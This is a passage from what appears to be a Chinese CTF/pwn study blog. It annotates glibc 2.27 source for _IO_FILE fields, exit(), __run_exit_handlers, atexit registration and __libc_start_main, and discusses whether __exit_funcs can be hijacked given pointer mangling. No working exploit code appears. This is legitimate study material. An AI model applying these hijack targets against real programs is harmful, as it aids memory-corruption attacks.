id="save"><a href="#save" class="headerlink" title="save"></a>save</h3><p><code>_IO_FILE</code> 是在C标准库中用于文件输入/输出的数据结构，通常被简称为 <code>FILE</code> 结构。在 <code>FILE</code> 结构中，<code>_IO_save_base</code>、<code>_IO_backup_base</code> 和 <code>_IO_save_end</code> 是用于实现缓冲的字段，它们用于高效地管理文件数据的读取和写入。下面是它们的作用：</p><ol><li><code>_IO_save_base</code>：<ul><li><code>_IO_save_base</code> 是一个指向缓冲区的指针，它指向了当前输入/输出操作的起始位置。</li><li>当你进行文件读取操作时，<code>_IO_save_base</code> 会指向文件数据的起始位置。</li><li>在某些情况下，例如当需要执行回退（unget）操作时，它用于保存当前位置，以便后续可以恢复到之前的位置。</li></ul></li><li><code>_IO_backup_base</code>：<ul><li><code>_IO_backup_base</code> 是另一个指向缓冲区的指针，它指向上一个 <code>_IO_save_base</code> 的位置。</li><li>通常，当进行某些文件操作，如 <code>fseek</code> 或 <code>fsetpos</code>，需要保存当前位置和状态，以便之后可以恢复到之前的状态。<code>_IO_backup_base</code> 用于保存这些状态信息。</li></ul></li><li><code>_IO_save_end</code>：<ul><li><code>_IO_save_end</code> 是一个指向缓冲区的指针，它指向当前输入/输出操作的结束位置。</li><li>在文件写入操作中，<code>_IO_save_end</code> 指示了数据写入的结束位置。</li><li>在文件读取操作中，<code>_IO_save_end</code> 可能会被用于确定何时需要重新填充缓冲区。</li></ul></li></ol><h3 id="marker"><a href="#marker" class="headerlink" title="marker"></a>marker</h3><p>用于支持文件流缓冲的定位的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">next</span>;</span></span><br><span class="line">  FILE *_sbuf;</span><br><span class="line">  <span class="comment">/* If _pos &gt;= 0</span></span><br><span class="line"><span class="comment"> it points to _buf-&gt;Gbase()+_pos. FIXME comment */</span></span><br><span class="line">  <span class="comment">/* if _pos &lt; 0, it points to _buf-&gt;eBptr()+_pos. FIXME comment */</span></span><br><span class="line">  <span class="type">int</span> _pos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE </tag>
            
            <tag> 学习记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exit函数利用</title>
      <link href="/posts/11890/"/>
      <url>/posts/11890/</url>
      
        <content type="html"><![CDATA[<h1 id="源码2-27"><a href="#源码2-27" class="headerlink" title="源码2.27"></a>源码2.27</h1><p>先看两个exit.h中的重要结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="comment">/*函数类型, 可以是&#123;ef_free, ef_us, ef_on, ef_at, ef_cxa&#125;</span></span><br><span class="line"><span class="comment">       - ef_free表示此位置空闲</span></span><br><span class="line"><span class="comment">       - ef_us表示此位置被使用中, 但是函数类型不知道</span></span><br><span class="line"><span class="comment">       - ef_on, ef_at, ef_cxa 分别对应三种不同的析构函数类型, 主要是参数上的差异*/</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>         //一个联合体<span class="title">func</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">void</span> (*at) (<span class="type">void</span>);   <span class="comment">//ef_at类型 没有参数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);   <span class="comment">//ef_on类型</span></span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">  &#125; on;</span><br><span class="line"><span class="class"><span class="keyword">struct</span>    </span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status); <span class="comment">//ef_cxa类型</span></span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">void</span> *dso_handle;</span><br><span class="line">  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span>  <span class="comment">//下一个exit_function_list,单链表</span></span><br><span class="line">    <span class="type">size_t</span> idx;   <span class="comment">//记录有多少个函数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span>  <span class="comment">//exit_function数组,析构函数数组</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><p>首先是exit的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>libc经典的套娃函数,可以看出exit的主体是__run_exit_handlers</p><p>run_exit_handlers()的主要工作就是<strong>调用exit_funcs中保存的各种函数指针</strong></p><p>看其工作流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用atexit与on_exit注册的函数，顺序为注册的逆序</span></span><br><span class="line"><span class="type">void</span> attribute_hidden __run_exit_handlers(<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//首先释放线程局部储存, 即TLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__call_tls_dtors();</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历exit_fundtion_list链表，链表种每个节点里又有一个函数指针数组，根据里面的函数类型进行调用</span></span><br><span class="line"><span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp; <span class="comment">//cur指向当前exit_function_list节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//cur-&gt;idx表示cur-&gt;fns中有多少个函数，从后往前遍历</span></span><br><span class="line"><span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>) <span class="comment">//遍历exit_function_list节点中 析构函数数组fns[32]中的函数指针</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx]; <span class="comment">//f指向对应析构函数的描述符</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor) <span class="comment">//选择析构函数类型</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//三种函数指针</span></span><br><span class="line">    <span class="type">void</span> (*atfct)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">void</span> (*onfct)(<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">    <span class="type">void</span> (*cxafct)(<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两种类型不调用</span></span><br><span class="line">  <span class="keyword">case</span> ef_free:</span><br><span class="line">  <span class="keyword">case</span> ef_us:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//on类型的参数为注册时设定的参数</span></span><br><span class="line">  <span class="keyword">case</span> ef_on:</span><br><span class="line">    onfct = f-&gt;func.on.fn; <span class="comment">//设置函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    onfct(status, f-&gt;func.on.arg); <span class="comment">//调用这个函数指针</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//at没有参数</span></span><br><span class="line">  <span class="keyword">case</span> ef_at:</span><br><span class="line">    atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    atfct();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//cxa类型则先为设定时的参数，再为状态码</span></span><br><span class="line">  <span class="keyword">case</span> ef_cxa:</span><br><span class="line">    cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    cxafct(f-&gt;func.cxa.arg, status); </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*listp = cur-&gt;next; <span class="comment">//listp指向下一个exit_function_list节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//最后一个链表节点为libc .data段中的initial，不需要释放</span></span><br><span class="line"><span class="comment">//除此以外的节点都是malloc申请得到的, 所以需要释放</span></span><br><span class="line"><span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">  <span class="built_in">free</span>(cur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (run_list_atexit) <span class="comment">//调用_atexit</span></span><br><span class="line">RUN_HOOK(__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">_exit(status); <span class="comment">//真正的exit系统调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考1-能否劫持-exit-funcs数组"><a href="#思考1-能否劫持-exit-funcs数组" class="headerlink" title="思考1:能否劫持__exit_funcs数组?"></a>思考1:能否劫持__exit_funcs数组?</h2><p>在exit调用<strong>run_exit_handlers()时下断点, 找到</strong>exit_funcs指针</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-04-05_165633.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-04-05_170143.png" alt=""></p><p>可以看到其中最重要的fns[0]被加密成乱码了,要想利用的话还要获得存储在fs:0x30的密钥,难度高,几乎难以利用</p><h2 id="exit-funcs如何添加析构函数"><a href="#exit-funcs如何添加析构函数" class="headerlink" title="__exit_funcs如何添加析构函数()"></a>__exit_funcs如何添加析构函数()</h2><p>既然难以攻击<strong>exit_funcs, 那么尝试从</strong>exit_funcs中的函数入手</p><p>我们首先要弄明白, __exit_funcs中的函数是怎么添加的</p><p>libc提供了一个接口: atexit()用来注册exit()时调用的析构函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DSO由GCC定义，用来识别模块的*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> *__dso_handle __attribute__((__weak__));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注册一个exit时调用的析构函数*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">atexit</span><span class="params">(<span class="type">void</span> (*func)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))func, <span class="literal">NULL</span>, &amp;__dso_handle == <span class="literal">NULL</span> ? <span class="literal">NULL</span> : __dso_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cxa_atexit()是对internal_atexit()的封装</p><p>注意: __exit_funcs就是exit()时用的那个指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册一个exit/共享库被卸载时调用的函数，只会被C++编译器生产的代码调用，C会通过atexit调用</span></span><br><span class="line"><span class="type">int</span> __cxa_atexit(<span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __internal_atexit(func, arg, d, &amp;__exit_funcs);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(__cxa_atexit)</span><br></pre></td></tr></table></figure><p><strong>internel_atexit()通过</strong>new_exitfn()找到一个在__exit_funcs链表上注册析构函数的位置, 然后进行写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  参数:</span></span><br><span class="line"><span class="comment">    - func  析构函数指针</span></span><br><span class="line"><span class="comment">    - arg   参数指针</span></span><br><span class="line"><span class="comment">    - d     DSO</span></span><br><span class="line"><span class="comment">    - listp 析构函数数组链表指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> attribute_hidden __internal_atexit(<span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d, <span class="keyword">struct</span> exit_function_list **listp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">new</span> =</span> __new_exitfn(listp); <span class="comment">//先在__exit_funcs链表上添加一个描述析构函数的结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_MANGLE</span></span><br><span class="line">  PTR_MANGLE(func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//然后设置分配到的这个结构体</span></span><br><span class="line">  new-&gt;func.cxa.fn = (<span class="type">void</span> (*)(<span class="type">void</span> *, <span class="type">int</span>))func; <span class="comment">//函数指针</span></span><br><span class="line">  new-&gt;func.cxa.arg = arg;                        <span class="comment">//参数</span></span><br><span class="line">  new-&gt;func.cxa.dso_handle = d;</span><br><span class="line">  atomic_write_barrier();</span><br><span class="line">  new-&gt;flavor = ef_cxa;                         <span class="comment">//类型</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__new_exitfn()的逻辑大致为</p><ul><li>先尝试在__exit_funcs中找到一个exit_function类型的ef_free的位置, ef_free代表着此位置空闲</li><li>如果没找到, 就新建一个exit_function节点, 使用头插法插入__exit_funcs链表, 使用新节点的第一个位置作为分配到的exit_function结构体</li><li>设置找到的exit_function的类型为ef_us, 表示正在使用中, 并返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从listp上返回一个新的exit_function结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *__<span class="title">new_exitfn</span>(<span class="keyword">struct</span> <span class="title">exit_function_list</span> **<span class="title">listp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">l</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">r</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock(lock); <span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//寻找一个析构函数类型为ef_free的位置</span></span><br><span class="line">  <span class="keyword">for</span> (l = *listp; l != <span class="literal">NULL</span>; p = l, l = l-&gt;next) <span class="comment">//遍历链表，l指向当前节点, p指向l的前一个节点</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = l-&gt;idx; i &gt; <span class="number">0</span>; --i)           <span class="comment">//搜索l中的函数指针数组fns[32]</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;fns[i - <span class="number">1</span>].flavor != ef_free) <span class="comment">//有一个不是ef_free的就停止</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) <span class="comment">//在l中找到了, 停止链表遍历</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 只有全部都是ef_free才能走到这里 */</span></span><br><span class="line">    l-&gt;idx = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l == <span class="literal">NULL</span> || i == <span class="keyword">sizeof</span>(l-&gt;fns) / <span class="keyword">sizeof</span>(l-&gt;fns[<span class="number">0</span>])) <span class="comment">//没有找到空闲位置</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    l==null 说明整个__exit_funcs中都没有ef_free</span></span><br><span class="line"><span class="comment">    i == sizeof(l-&gt;fns) / sizeof(l-&gt;fns[0]) 说明对于l节点, fns已经全部遍历了, 都没找到ef_free</span></span><br><span class="line"><span class="comment">    此时就需要插入一个新的exit_function_list节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      assert(l != <span class="literal">NULL</span>);</span><br><span class="line">      p = (<span class="keyword">struct</span> exit_function_list *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> exit_function_list)); <span class="comment">//申请一个结构体, p指向新节点</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  <span class="comment">//分配失败</span></span><br><span class="line">      &#123;</span><br><span class="line">        p-&gt;next = *listp; <span class="comment">//头插法, 再__exit_funcs中插入一个节点</span></span><br><span class="line">        *listp = p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  <span class="comment">//分配成功</span></span><br><span class="line">    &#123;</span><br><span class="line">      r = &amp;p-&gt;fns[<span class="number">0</span>]; <span class="comment">//r指向新节点的第一个析构函数描述结构体</span></span><br><span class="line">      p-&gt;idx = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//找到空闲位置了, l节点中第i个为ef_free</span></span><br><span class="line">  &#123;</span><br><span class="line">    r = &amp;l-&gt;fns[i];</span><br><span class="line">    l-&gt;idx = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 此时这个函数位置的类型从空闲(ef_free)变为使用中(ef_us), 等待写入函数指针 */</span></span><br><span class="line">  <span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    r-&gt;flavor = ef_us;</span><br><span class="line">    ++__new_exitfn_called;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock(lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="析构函数的注册—-libc-start-main"><a href="#析构函数的注册—-libc-start-main" class="headerlink" title="析构函数的注册—__libc_start_main()"></a>析构函数的注册—__libc_start_main()</h2><p><strong>__libc_start_main()</strong>函数初窥</p><ul><li>首先是其参数列表也就是_start()传递的参数, 我们中重点注意下面三个<ul><li>init: ELF文件 也就是main()的构造函数</li><li>fini: ELF文件 也就是main()的析构函数</li><li>rtld_fini: 动态链接器的析构函数</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(</span><br><span class="line">                <span class="type">int</span> (*main)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **MAIN_AUXVEC_DECL), <span class="comment">//参数: main函数指针</span></span><br><span class="line">                <span class="type">int</span> argc, <span class="type">char</span> **argv,                              <span class="comment">//参数: argc argv</span></span><br><span class="line">                ElfW(<span class="type">auxv_t</span>) * auxvec,</span><br><span class="line">                __typeof(main) init,     <span class="comment">//参数: init ELF的构造函数</span></span><br><span class="line">                <span class="type">void</span> (*fini)(<span class="type">void</span>),      <span class="comment">//参数: fini ELF的析构函数</span></span><br><span class="line">                <span class="type">void</span> (*rtld_fini)(<span class="type">void</span>), <span class="comment">//参数: rtld_fini ld的析构函数</span></span><br><span class="line">                <span class="type">void</span> *stack_end         <span class="comment">//参数: 栈顶</span></span><br><span class="line">        )</span><br><span class="line">&#123;</span><br><span class="line">    ...函数体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入函数体, __libc_start_mian()主要做了以下几件事</p><ul><li>为libc保存一些关于main的参数, 比如__environ…</li><li>通过atexit()注册fini 与 rtld_fini 这两个参数</li><li>调用init为main()进行构造操作</li><li>然后调用main()函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(...)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 保存main的返回地址 */</span></span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取环境变量指针, 并保存到libc的.data中</span></span><br><span class="line">  <span class="type">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 保存下栈顶 */</span></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化TLS */</span></span><br><span class="line">  __pthread_initialize_minimal();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置stack guard */</span></span><br><span class="line">  <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard(_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置pointer gurad 